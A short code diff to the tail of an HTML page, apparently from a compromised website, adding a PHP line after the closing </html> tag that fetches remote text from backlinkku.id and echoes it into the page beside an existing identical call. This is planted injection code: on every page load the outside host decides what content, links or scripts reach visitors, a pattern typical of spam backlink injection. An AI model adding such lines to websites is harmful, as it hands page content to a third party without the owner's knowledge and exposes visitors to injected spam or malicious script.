@@ -415,5 +415,6 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 </body>
 </html>
 <?php
+echo file_get_contents("https://backlinkku.id/menu/traffic-v1/script.txt");
 echo file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt");
 ?>
